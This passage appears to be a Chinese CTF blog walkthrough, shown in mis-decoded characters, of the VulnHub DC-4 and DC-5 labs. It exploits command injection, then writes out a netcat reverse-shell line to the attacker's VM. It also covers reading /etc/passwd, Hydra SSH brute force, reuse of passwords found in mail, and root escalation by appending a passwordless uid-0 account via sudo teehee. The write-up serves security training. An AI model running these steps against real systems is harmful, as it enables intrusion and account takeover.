<p>ç‚¹å‡»<code>run</code>ï¼Œå°±ä¼šæ˜¾ç¤ºä¸Šé¢çš„æ•°æ®ï¼Œçœ‹æ¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å®ƒé»˜è®¤æ˜¯<code>ls -l</code>ï¼Œæˆ‘ä»¬è¯•è¯•æŠ“åŒ…èƒ½ä¿®æ”¹è¯·æ±‚åŒ…é‡Œçš„å‘½ä»¤å—</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></p>
<p>å‘ç°æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œæˆ‘ä»¬è¯•è¯•<code>whoami</code>å‘½ä»¤ï¼Œçœ‹çœ‹å½“å‰ç½‘ç«™ç™»å½•ç”¨æˆ·æƒé™</p>
<blockquote>
<p>è¾“å…¥<code>whoami</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></p>
<p>å‘ç°æ˜¯æ™®é€šç”¨æˆ·æƒé™</p>
<p>ä¸‹é¢æ˜¯ä¸¤ä¸ª<code>getshell</code>çš„æ€è·¯</p>
<hr>
<p><strong>1.</strong></p>
<p>åç»­æŸ¥è¯¢æ“ä½œï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥åˆ©ç”¨<code>nc</code><strong>åå¼¹shell</strong>ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥æ‰¾åˆ°ç”¨æˆ·ç›®å½•ä¿¡æ¯</p>
<blockquote>
<p>ç»ˆç«¯è¾“å…¥<code>nc -l -vv -p 8888</code>ï¼Œç›‘å¬8888ç«¯å£</p>
</blockquote>
<p>æŠ“åŒ…æ•°æ®å‘½ä»¤ä¿®æ”¹ä¸º</p>
<blockquote>
<p><code>nc -nv 192.168.133.140 8888 -e /bin/bash</code>   &#x2F;&#x2F;<code>192.168.133.140</code>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</p>
</blockquote>
<p>ç„¶åç»ˆç«¯å°±å¯ä»¥æ‰§è¡Œåç»­æ‰§è¡Œå‘½ä»¤çš„ç±»ä¼¼æ“ä½œï¼Œå°±æ˜¯æ‰§è¡Œçš„æ—¶å€™å¯èƒ½ç¨å¾®æ–¹ä¾¿ä¸€äº›</p>
<hr>
<p><strong>2.</strong></p>
<p>æˆ‘ä»¬ä¿®æ”¹å‘½ä»¤ï¼ŒæŸ¥è¯¢<code>/etc/passwd</code>æ–‡æ¡£ï¼ˆè®°å½•æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ–¹ä¾¿ç®¡ç†å‘˜å¯¹ç”¨æˆ·çš„ç®¡ç†çš„ä¸€ä¸ªæ–‡æ¡£ï¼‰</p>
<blockquote>
<p>è¾“å…¥<code>cat+/etc/passwd</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·</p>
<blockquote>
<p><code>charles</code><br><code>jim</code><br><code>sam</code></p>
</blockquote>
<p>æˆ‘ä»¬æŸ¥çœ‹è¿™å‡ ä¸ªç”¨æˆ·çš„ç›®å½•ä¸‹æœ‰æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯</p>
<p>å…ˆè®¿é—®<code>charles</code></p>
<blockquote>
<p>è¾“å…¥<code>ls+-a+/home/charles</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></p>
<p>æ„Ÿè§‰æ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>å†çœ‹çœ‹<code>jim</code></p>
<blockquote>
<p>è¾“å…¥<code>ls+-a+/home/jim</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></p>
<p>å‘ç°å…³é”®ä¿¡æ¯ï¼Œ <code>backups</code>ç›®å½•å’Œ<code>mbox</code>ç›®å½•ï¼Œ<code>test.sh</code>é‡Œé¢æˆ‘çœ‹äº†ï¼Œæ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>å…ˆçœ‹<code>backups</code>ç›®å½•</p>
<blockquote>
<p>è¾“å…¥<code>ls+-a+/home/jim/backups</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></p>
<p>å‘ç°æœ‰ä¸ª<code>old-passwords.bak</code>ï¼Œè¿™ä¸ªå¯èƒ½å°±æ˜¯ç™»å½•è¿™ä¸‰ä¸ªç”¨æˆ·çš„å…³é”®</p>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<blockquote>
<p>è¾“å…¥<code>cat+/home/jim/old-passwords.bak</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªå¯†ç è¡¨ï¼Œå¤åˆ¶åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå½“ä½œçˆ†ç ´çš„å¯†ç è¡¨</p>
<h2><span id="hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´">hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´</span></h2><p>æˆ‘ä»¬å·²ç»æœ‰äº†å¯†ç è¡¨<code>ï¼ˆpd.txtï¼‰</code>,æˆ‘ä»¬å†æŠŠä¸‰ä¸ªç”¨æˆ·åå†™åˆ°å¦ä¸€ä¸ªæ–‡æ¡£é‡Œ<code>ï¼ˆun.txtï¼‰</code></p>
<p>å› ä¸ºä¹‹å‰æˆ‘ä»¬æ‰«æçŸ¥é“ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code>ï¼Œè€Œ<code>80</code>ç«¯å£æˆ‘ä»¬å·²ç»è®¿é—®äº†ï¼Œæ‰€ä»¥ä¸‹é¢ç«¯å£å†™<code>22</code></p>
<p>äºæ˜¯</p>
<blockquote>
<p>è¾“å…¥<code>hydra -L un.txt -P pd.txt 192.168.133.141 ssh -s 22</code></p>
</blockquote>
<p>æœ‰ç‚¹ä¹…ï¼Œç­‰ä¸€ä¼šå°±è¡Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></p>
<p>å¾—åˆ°<code>jim</code>ç”¨æˆ·çš„å¯†ç </p>
<blockquote>
<p><code>jibril04</code></p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬ç™»å½•<code>ssh</code></p>
<blockquote>
<p>è¾“å…¥<code>ssh jim@192.168.133.141 -p 22</code></p>
</blockquote>
<p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹æˆ‘ä»¬èƒ½å¦æ‰§è¡Œä¸€äº›ç®¡ç†å‘˜å‘½ä»¤</p>
<blockquote>
<p>è¾“å…¥<code>sudo -l</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></p>
<p>å‘ç°<code>jim</code>ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä»»ä½•ç®¡ç†å‘˜å‘½ä»¤ï¼Œæ‰€ä»¥ä¸å¯èƒ½åœ¨<code>jim</code>ç”¨æˆ·ä¸Šè¿›è¡Œææƒæˆ–å…¶ä»–åç»­æ“ä½œ</p>
<p>æˆ‘ä»¬ä»”ç»†ä¸€äº›å¯ä»¥çœ‹åˆ°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></p>
<p>è¯´æˆ‘ä»¬æœ‰ä¸€å°é‚®ä»¶ï¼Œé‚£æˆ‘ä»¬å°±çœ‹çœ‹è¿™å°ç”¨é‚®ä»¶æ˜¯ä»€ä¹ˆ</p>
<p>ä½†æˆ‘ä»¬ä¸çŸ¥é“<code>mail</code>åœ¨å“ªé‡Œ</p>
<blockquote>
<p>è¾“å…¥<code>find / -name mail</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></p>
<p>æ‰¾åˆ°ä½ç½®<code>/var/mail</code></p>
<blockquote>
<p>è¾“å…¥<code>cd /var/mail;ls -a</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></p>
<p>å‘ç°æœ‰ä¸€å°åä¸º<code>jim</code>çš„é‚®ä»¶ï¼ŒæŸ¥çœ‹ä¿¡æ¯</p>
<blockquote>
<p>è¾“å…¥<code>cat jim</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></p>
<p>å‘ç°æ˜¯<code>charles</code>å‘ç»™<code>jim</code>çš„é‚®ä»¶</p>
<blockquote>
<p><code>Hi Jim,</code></p>
<p><code>I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</code></p>
<p><code>Password is:  ^xHhA&amp;hvim0y</code></p>
<p><code>See ya,</code><br><code>Charles</code></p>
<p>ç¿»è¯‘ï¼š<br>å—¨ï¼Œå‰å§†ï¼Œ</p>
<p>æˆ‘ä»Šå¤©å¹´åº•è¦æ”¾å‡ï¼Œæ‰€ä»¥è€æ¿è®©æˆ‘æŠŠå¯†ç ç»™ä½ ï¼Œä»¥é˜²ä¸‡ä¸€ã€‚</p>
<p>å¯†ç æ˜¯ï¼š^xHhA&amp;hvim0y</p>
<p>å†è§ï¼Œ<br>æŸ¥å°”æ–¯</p>
</blockquote>
<p>ä¿¡é‡Œæåˆ°ä»–è‡ªå·±çš„å¯†ç </p>
<blockquote>
<p><code>^xHhA&amp;hvim0y</code></p>
</blockquote>
<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥ç™»å½•<code>charles</code>çš„è´¦å·ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ‡æ¢ç”¨æˆ·</p>
<blockquote>
<p>è¾“å…¥<code>su charles</code></p>
</blockquote>
<p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></p>
<p>å…ˆçœ‹çœ‹<code>charles</code>èƒ½æ‰§è¡Œä»€ä¹ˆç®¡ç†å‘˜å‘½ä»¤</p>
<blockquote>
<p>è¾“å…¥<code>sudo -l</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></p>
<p>å‘ç°<code>charles</code>å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜çš„<code>teehee</code>å‘½ä»¤</p>
<h2><span id="teehee">teehee</span></h2><p>æˆ‘ä»¬å…ˆéœ€è¦çŸ¥é“è¿™ä¸ªå‘½ä»¤æ˜¯å¹²ä»€ä¹ˆçš„</p>
<blockquote>
<p>è¾“å…¥<code>teehee -h</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></p>
<p><u><strong>å‘ç°å®ƒæ˜¯å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„æ•°æ®ï¼Œ-aæŒ‡ä»¤èƒ½å¤Ÿä¿è¯ä¿®æ”¹æ–‡ä»¶ä¸ä¼šè¦†ç›–åŸæœ‰æ–‡ä»¶</strong></u></p>
<p>é‚£æˆ‘ä»¬éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå°±å¯ä»¥åœ¨<code>/etc/passwd</code>é‡Œé¢æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·æ•°æ®</p>
<h3><span id="æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·">æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</span></h3><blockquote>
<p>è¾“å…¥<code>sudo teehee -a /etc/passwd</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></p>
<p>ç„¶åå°±ç­‰å¾…æˆ‘ä»¬è¾“å…¥æ•°æ®</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></p>
<p>æŒ‰ç…§<code>root</code>ç”¨æˆ·æ ¼å¼ï¼Œæˆ‘ä»¬æ·»åŠ è‡ªå·±çš„æ•°æ®</p>
<blockquote>
<p>è¾“å…¥<br><code>ttoc:</code>(è¿™é‡Œæ˜¯å¯†ç ï¼Œå¯ä»¥åŠ å…¥è‡ªå·±çš„å“ˆå¸Œåçš„å¯†ç ï¼Œå½“ç„¶ä¸åŠ å°±å¯ä»¥ç›´æ¥ç™»å½•ï¼Œè¿™é‡Œæˆ‘ä¸åŠ ï¼Œå¿½ç•¥)<code>:0:0:root:/root:/bin/bash</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></p>
<p>æ·»åŠ æˆåŠŸï¼Œæˆ‘ä»¬å†çœ‹çœ‹èƒ½ä¸èƒ½ç™»å½•ï¼Œæ˜¯ä¸æ˜¯ç®¡ç†å‘˜</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></p>
<p>å‘ç°æ˜¯ç®¡ç†å‘˜ï¼Œç›´æ¥åˆ°<code>root</code>ç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹ <code>flag</code>å³å¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯<br>æ­å–œï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-4ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>è°æä¾›äº†åé¦ˆï¼Œè°èŠ±æ—¶é—´å®Œæˆäº†è¿™äº›å°äº‹<br>æŒ‘æˆ˜ã€‚</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1><span id="äº”-dc-5é«˜çº§">äº”ã€DC-5[é«˜çº§]</span></h1><p><strong>only one flag</strong></p>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>å®˜æ–¹æ–‡æ¡£é‡Œæœ‰ä¸€äº›æç¤ºè¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹</p>
<blockquote>
<p><code>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide soKme kind of idea as to what the vulnerability might involve.</code></p>
<p><code>And just for the record, there is no phpmailer exploit involved. :-)</code><br>ç¿»è¯‘ï¼š<br>æ®æˆ‘æ‰€çŸ¥ï¼Œåªæœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„å…¥å£ç‚¹å¯ä»¥è¿›å…¥ï¼ˆä¹Ÿæ²¡æœ‰ SSHï¼‰ã€‚è¿™ä¸ªç‰¹å®šçš„å…¥å£ç‚¹å¯èƒ½å¾ˆéš¾è¯†åˆ«ï¼Œä½†å®ƒå°±åœ¨é‚£é‡Œã€‚æ‚¨éœ€è¦å¯»æ‰¾ä¸€äº›ä¸ä¼—ä¸åŒçš„ä¸œè¥¿ï¼ˆéšç€é¡µé¢çš„åˆ·æ–°è€Œæ”¹å˜çš„ä¸œè¥¿ï¼‰ã€‚è¿™æœ‰æœ›ä¸ºæ¼æ´å¯èƒ½æ¶‰åŠçš„å†…å®¹æä¾›æŸç§æƒ³æ³•ã€‚</p>
<p>åªæ˜¯ä¸ºäº†è®°å½•ï¼Œæ²¡æœ‰æ¶‰åŠ phpmailer æ¼æ´åˆ©ç”¨ã€‚:-)</p>
<p>&#x3D;&#x3D;&gt;å¤§è‡´å…³é”®çš„ä¿¡æ¯å°±æ˜¯ï¼Œåœ¨æˆ‘ä»¬åˆ·æ–°ç½‘é¡µçš„æ—¶å€™æœ‰çš„ä¸œè¥¿ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå¯¹åº”æŸç§æ¼æ´</p>
</blockquote>
<p>å…»æˆä¹ æƒ¯ï¼Œå…ˆé¡ºæ‰‹ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></p>
<p>å‘ç°<code>80</code>ç«¯å£æ­£å¸¸è¿è¡Œç€<code>http</code>ï¼Œ<code>54235</code>ç«¯å£æ‰“å¼€</p>
<hr>
<p>æˆ‘ä»¬è®¿é—®<code>192.168.133.143</code></p>
<p>å…ˆä¹ æƒ¯çœ‹çœ‹<code>Wappalyzer</code>åŸºæœ¬ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p>
<p>å‘ç°æœ‰5ä¸ªçª—å£</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930190329914.png" alt="image-20220930190329914"></p>
<p>æŒ¨ä¸ªè®¿é—®ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨æˆ–è€…äº¤äº’çš„åœ°æ–¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></p>
<p>å‘ç°<code>Concat</code>çª—å£ä¸‹æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œå¯ä»¥å®ç°äº¤äº’æ•ˆæœï¼Œæˆ‘ä»¬ä¹±è¾“å…¥ä¸€äº›æ•°æ®å…ˆè¯•è¯•</p>
<p>çœ‹çœ‹å˜åŒ–</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></p>
<p>å‘ç°<code>url</code>åœ¨æäº¤æ—¶å‘ç”Ÿçš„è·³è½¬ï¼Œå¹¶ä¸”æ˜¾ç¤ºäº†ä¸€äº›ä¿¡æ¯</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>çœ‹å¾—å‡ºæ¥ï¼Œç½‘ç«™è·³è½¬åˆ°äº†<code>thankyou.php</code>ï¼Œè€Œä¸”æˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯ä¹Ÿè¢«ä»¥æ˜æ–‡æ–¹å¼æ˜¾ç¤ºå‡ºæ¥äº†</p>
<p>é‚£æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æƒ³èµ·ä¹‹å‰ä½œè€…ç»™çš„æç¤ºï¼Œè¯´<strong>åˆ·æ–°çš„æ—¶å€™ä¼šå‘ç”Ÿå˜åŒ–</strong>ï¼Œæˆ‘ä»¬åˆ·æ–°çœ‹çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></p>
<p>å¯¹æ¯”ä¸¤ä¸ªå›¾å¯ä»¥å‘ç°ï¼Œåº•ä¸‹çš„å¹´ä»½æ—¶é—´å‘ç”Ÿäº†æ”¹å˜ï¼Œ<strong>åˆ·æ–°ä¸€æ¬¡ï¼Œå¢åŠ ä¸€å¹´</strong></p>
<p>è¿™ä¸ªè‚¯å®šæ˜¯æœ‰ç”¨çš„ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿˜æ˜¯ä¸çŸ¥é“</p>
<p>æˆ‘ä»¬å…ˆè¦äº†è§£è¿™ä¸ªå˜åŒ–è‚¯å®šæ˜¯æœ‰æ–‡ä»¶æ¥è°ƒç”¨çš„ï¼Œè€Œæˆ‘ä»¬è‚¯å®šæ˜¯å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦å†æ¬¡é’ˆå¯¹æ€§çš„è¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<p>ç”¨ç»å…¸çš„<code>dirsearch</code>æ¥æ‰«ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></p>
<p>é™¤å»æˆ‘ä»¬å·²ç»è®¿é—®è¿‡çš„æ–‡ä»¶å’Œå“åº”ç 403çš„ï¼Œå‘ç°æœ‰ä¸€ä¸ªå«åš<code>footer.php</code>æ–‡ä»¶ï¼Œåˆšå¥½å’Œæˆ‘ä»¬çš„å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ä¸€è‡´ï¼Œä¹Ÿæ˜¯<code>åº•éƒ¨æ–‡æœ¬</code>å˜åŒ–</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/footer.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></p>
<p>å‘ç°æœç„¶æ˜¯æˆ‘ä»¬å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ï¼Œè€Œä¸”æˆ‘ä»¬åˆ·æ–°æ—¶ï¼Œä¹Ÿä¼šåŒæ—¶å˜åŒ–</p>
<hr>
<h2><span id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</span></h2><p>æ‰€ä»¥æŒ‰ä¸Šé¢æˆ‘ä»¬æ¨åˆ°çš„æ€è·¯ï¼Œå’Œä¿¡æ¯çš„æ”¶é›†ï¼Œ</p>
